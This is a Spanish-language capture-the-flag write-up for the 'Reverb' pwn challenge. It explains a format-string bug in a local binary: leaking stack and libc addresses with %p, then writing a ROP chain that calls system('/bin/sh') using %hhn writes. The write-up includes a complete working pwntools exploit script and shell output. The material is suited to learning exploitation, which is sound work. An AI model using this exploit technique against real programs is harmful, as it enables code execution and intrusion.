# PWN / Reverb

Parcheamos el ELF para asegurarnos que usa el mismo enlazador dinamico y libc que el remoto:
```
patchelf --set-interpreter ld-linux-x86-64.so.2 --set-rpath $(pwd) chall
chmod u+x libc.so.6 ld-linux-x86-64.so.2 chall
./chall 
>> Soy el senor Meeseeks
Soy el senor Meeseeks
```

Vemos las propiedades del ejecutable:
```
checksec --file=chall
[*] '/home/kalcast/Descargas/reverb/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Vemos el código fuente y antes de imprimir la cadena se verifica con la función check que si hay caracteres '%' en la cadena: 
+ Debe tener al menos dos dígitos después
+ Los dígitos no deben comenzar con '0'
+ La conversión de esa cadena de dígitos a un entero largo debe ser menor o igual a 58

El parámetro %p en una cadena de formato se utiliza para imprimir una dirección de memoria en formato hexadecimal, con varias podemos imprimir las direcciones de memoria en la pila. Usar %10p es lo mismo que %p solo que imprimirá con un padding de 10 caracteres.

Con esto hacemos un script para filtrar la pila:

``` python3
from pwn import *

elf = context.binary = ELF('./chall')
io = process(elf.path)

# el buffer es de 384 caracteres asi que podemos leer 384/4=96 direcciones de memoria de la pila
io.sendlineafter(b">> ",b"%10p"*90)  

stack = io.recvline(False)

# Convertir las filtraciones a un array de direcciones de memoria empaquetadas
stack = [
       p64(int(s,16))
       for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
]

# formatear la salida para observar mejor
for i,s in enumerate(stack):
    print(f"{i}: {s} {hex(u64(s))}")

```

```
0: b'\n\x00\x00\x00\x00\x00\x00\x00' 0xa
1: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
2: b'R\x0b\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00b52
3: b'\x99\x99\x99\x99\x99\x99\x99\x19' 0x1999999999999999
4: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
5: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
6: b'\xc8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fc8
7: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
8: b'\x00\x00@\x00\x01\x00\x00\x00' 0x100400000
9: b'%10p%10p' 0x7030312570303125
10: b'%10p%10p' 0x7030312570303125
11: b'%10p%10p' 0x7030312570303125
12: b'%10p%10p' 0x7030312570303125
13: b'%10p%10p' 0x7030312570303125
14: b'%10p%10p' 0x7030312570303125
15: b'%10p%10p' 0x7030312570303125
16: b'%10p%10p' 0x7030312570303125
17: b'%10p%10p' 0x7030312570303125
18: b'%10p%10p' 0x7030312570303125
19: b'%10p%10p' 0x7030312570303125
20: b'%10p%10p' 0x7030312570303125
21: b'%10p%10p' 0x7030312570303125
22: b'%10p%10p' 0x7030312570303125
23: b'%10p%10p' 0x7030312570303125
24: b'%10p%10p' 0x7030312570303125
25: b'%10p%10p' 0x7030312570303125
26: b'%10p%10p' 0x7030312570303125
27: b'%10p%10p' 0x7030312570303125
28: b'%10p%10p' 0x7030312570303125
29: b'%10p%10p' 0x7030312570303125
30: b'%10p%10p' 0x7030312570303125
31: b'%10p%10p' 0x7030312570303125
32: b'%10p%10p' 0x7030312570303125
33: b'%10p%10p' 0x7030312570303125
34: b'%10p%10p' 0x7030312570303125
35: b'%10p%10p' 0x7030312570303125
36: b'%10p%10p' 0x7030312570303125
37: b'%10p%10p' 0x7030312570303125
38: b'%10p%10p' 0x7030312570303125
39: b'%10p%10p' 0x7030312570303125
40: b'%10p%10p' 0x7030312570303125
41: b'%10p%10p' 0x7030312570303125
42: b'%10p%10p' 0x7030312570303125
43: b'%10p%10p' 0x7030312570303125
44: b'%10p%10p' 0x7030312570303125
45: b'%10p%10p' 0x7030312570303125
46: b'%10p%10p' 0x7030312570303125
47: b'%10p%10p' 0x7030312570303125
48: b'%10p%10p' 0x7030312570303125
49: b'%10p%10p' 0x7030312570303125
50: b'%10p%10p' 0x7030312570303125
51: b'%10p%10p' 0x7030312570303125
52: b'%10p%10p' 0x7030312570303125
53: b'%10p%10p' 0x7030312570303125
54: b'\n\x00\x00\x00\x00\x00\x00\x00' 0xa
55: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
56: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
57: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
58: b'\x00\x07\xc4\xa2\xa7\x81\xf9\xcc' 0xccf981a7a2c40700
59: b'\x01\x00\x00\x00\x00\x00\x00\x00' 0x1
60: b'\x90\x9d"gW\x7f\x00\x00' 0x7f5767229d90
61: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
62: b'z\x13@\x00\x00\x00\x00\x00' 0x40137a
63: b'\x00\x00\x00\x00\x01\x00\x00\x00' 0x100000000
64: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
65: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
66: b'\xa6(6\xad)O5\xc9' 0xc9354f29ad3628a6
67: b'\xb8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb8
68: b'z\x13@\x00\x00\x00\x00\x00' 0x40137a
69: b'\x18>@\x00\x00\x00\x00\x00' 0x403e18
70: b'@ ]gW\x7f\x00\x00' 0x7f57675d2040
71: b'\xa6(T\xb0I\xa4\xc86' 0x36c8a449b05428a6
72: b'\xa6(\xbc\x97l\x81\x9b7' 0x379b816c97bc28a6
73: b'\x00\x00\x00\x00W\x7f\x00\x00' 0x7f5700000000
74: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
75: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
76: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
77: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
78: b'\x00\x07\xc4\xa2\xa7\x81\xf9\xcc' 0xccf981a7a2c40700
79: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
80: b'@\x9e"gW\x7f\x00\x00' 0x7f5767229e40
81: b'\xc8\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fc8
82: b'\x18>@\x00\x00\x00\x00\x00' 0x403e18
83: b'\xe02]gW\x7f\x00\x00' 0x7f57675d32e0
84: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
85: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
86: b'\xd0\x10@\x00\x00\x00\x00\x00' 0x4010d0
87: b'\xb0\x0f\xb0\xf5\xfe\x7f\x00\x00' 0x7ffef5b00fb0
88: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
89: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
```

En la offset 60 hay una dirección filtrada de libc. Si vemos el mapa de la memoria y buscamos la dirección base de libc en la GOT y calculamos el desplazamiento tendremos la dirección base en ejecución del programa:

```
[0x0040146c]> pxQ @ rsp + 0x168
0x7ffc8981fe08 0x7030312570303125 
0x7ffc8981fe10 0x7030312570303125 
0x7ffc8981fe18 0x7030312570303125 
0x7ffc8981fe20 0x7030312570303125 
0x7ffc8981fe28 0x000000000000000a section.+10
0x7ffc8981fe30 0x0000000000000000 section.
0x7ffc8981fe38 0x0000000000000000 section.
0x7ffc8981fe40 0x000000000000000a section.+10
0x7ffc8981fe48 0x96d00259e857ad00 
0x7ffc8981fe50 0x0000000000000001 section.+1
0x7ffc8981fe58 0x00007fde7aa29d90                 <--- offset 60
```

```
dm
0x00000000003fe000 - 0x00000000003ff000 - usr     4K s rw- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; segment.ehdr
0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall
0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; map._home_kalcast_Descargas_reverb_chall.r_x
0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; map._home_kalcast_Descargas_reverb_chall.r__
0x0000000000403000 - 0x0000000000404000 - usr     4K s r-- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; map._home_kalcast_Descargas_reverb_chall.rw_
0x0000000000404000 - 0x0000000000405000 - usr     4K s rw- /home/kalcast/Descargas/reverb/chall /home/kalcast/Descargas/reverb/chall ; obj._GLOBAL_OFFSET_TABLE_
0x00007fde7aa00000 - 0x00007fde7aa28000 - usr   160K s r-- /home/kalcast/Descargas/reverb/libc.so.6 /home/kalcast/Descargas/reverb/libc.so.6           <---- libc base de la depuracion actual
```

``` 
[0x0040146c]> ? 0x00007fde7aa29d90   - 0x00007fde7aa00000
int32   171408
uint32  171408
hex     0x29d90              <---- offset de la direccion filtrada con respecto a libc base
octal   0516620
unit    167.4K
segment 2000:9d90
string  "\x90\x9d\x02"
fvalue  171408.0
float   0.000000000000000f
double  0.000000000000000
binary  0b000000101001110110010000
base36  0_3o9c
ternary 0t22201010110 
```

En el offset 7 se filtra un puntero al mismo stack. Podemos obtener el valor de la direccion que filtra a libc (el retorno) para posteriormente sobreescribirlo con nuestra carga util. Le restamos rbp por el ajuste que se hace antes de retornar de una funcion en la pila, y luego restamos 8 por el tamaño reservado para variables al llamar a una función en el x86_64.

```
[0x0040146c]> pxQ @ rsp - 0x40
0x7ffc8981fc60 0x00007fde7ae39040 r15 
0x7ffc8981fc68 0x00007fde7aa7f410  
0x7ffc8981fc70 0x0000000000000000 section.                <---- offset 0 
0x7ffc8981fc78 0x00007ffc8981fe50 rbp
0x7ffc8981fc80 0x00007ffc8981ff68 r12
0x7ffc8981fc88 0x000000000040137a main
0x7ffc8981fc90 0x0000000000403e18 section..fini_array
0x7ffc8981fc98 0x0000000000401462 main+232
0x7ffc8981fca0 0x0000000000000000 section.     
0x7ffc8981fca8 0x00007ffc8981ff78 r12+16                  <---- offset 6
0x7ffc8981fcb0 0x00007ffc8981ff68 r12      
```

```
[0x0040146c]> ? 0x00007ffc8981ff78 - rbp - 8
int32   288
uint32  288
hex     0x120     <---- 
octal   0440
unit    288
segment 0000:0120
string  " \x01"
fvalue  288.0
float   0.000000000000000f
double  0.000000000000000
binary  0b0000000100100000
base36  0_80
ternary 0t101200
```

``` python3 
libc_base = u64(stack[60]) - 0x29D90
libc.address = libc_base
ret_addr = u64(stack[6]) - 0x120
```

La cadena %n nos permite escribir valores en la dirección de memoria que representa un valor en la pila, esta imprimirá el tamaño de nuestra entrada a esa dirección de memoria. Por ejemplo "AAAA%n" imprimirá el valor 4 en la dirección especificada por el valor en el offset 0. Otras variantes son %hn que escribe dos bytes y %hhn que escribe un byte; usaremos este ultimo ya que tenemos entradas infinitas.

Podemos usar esto sabiendo que en el offset 9 comienza nuestra entrada, pero por las restricciones necesitamos pasar un número, de 10 a 57 después de cada caracter '%'

La cadena %x muestra los 4 bytes mas significativos (recuerdese que esto es little-endian) del valor al que apunta la pila. Por ejemplo, si en el offset 6 se encuentra el valor '0x12345678' un %6$x imprimirá '5678'.

Juntando todo lo anterior usar %{offset_stack_1}${padding}x%{offset_stack_2}hhn nos permite imprimir un byte con el valor especificado en 'padding' en la dirección offset_stack_2.

Bien, ahora llevándolo a nuestro caso, para evitar que el valor almacenado no supere nunca el padding debemos escoger un offset_stack_1 que tenga sus 4 bytes más significativos en 0 (offset 57 servirá) y dado que nuestra entrada comienza en el offset 9(posicion 10 porque $ comienza con indice 1) y será un poco larga usaremos 24 bytes (3 offsets), por lo que la dirección a la que escribiremos se almacenará en offset 12(posicion 13).

+ Se ignorará el solicitar un padding para los bytes nulos puesto que no lo requieren
+ Se usará ljust para ajustar las cadenas de formato a direcciones de memoria completas

Solo queda hacer ROP, haremos una llamada a system("bin/sh"):

``` python
# solve.py
from pwn import *

exe = context.binary = ELF('./chall')
libc = exe.libc
io = process(exe.path)

# 1. Inspeccionar el stack
io.sendlineafter(b">> ",b"%10p"*90)  
stack = io.recvline(False)
stack = [
       p64(int(s,16))
       for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
]


# 2. Obtener libc base y direccion de retorno a la direccion anterior al valor de offset 0
libc_base = u64(stack[60]) - 0x29D90
libc.address = libc_base
ret_addr = u64(stack[6]) - 0x120


# 3. ROP
rop = ROP([exe,libc])
rop.raw(rop.ret.address)                            # Alinear el stack  
rop.call("system",[next(libc.search(b"/bin/sh"))])
chain = rop.chain()

for i in range(len(chain)):
    p = b""
    if chain[i] != 0:
        p += f"%57${chain[i]}x".encode()
    p += b"%13$hhn"
    p = p.ljust(24, b"_")                   
    p += p64(ret_addr + i)
    io.sendlineafter(b">> ", p)

s = b"%s".ljust(8,b"_")
io.sendlineafter(b">> ",s)                        # Provocar el retorno y con ello la llamada a nuestro codigo
io.interactive()
```

``` 
python3 solve.py 
[*] '/home/kalcast/Descargas/reverb/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/kalcast/Descargas/reverb/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process '/home/kalcast/Descargas/reverb/chall': pid 33652
[*] Loaded 5 cached gadgets for './chall'
[*] Loaded 219 cached gadgets for '/home/kalcast/Descargas/reverb/libc.so.6'
[*] Switching to interactive mode
$ whoami
kalcast
$  
```
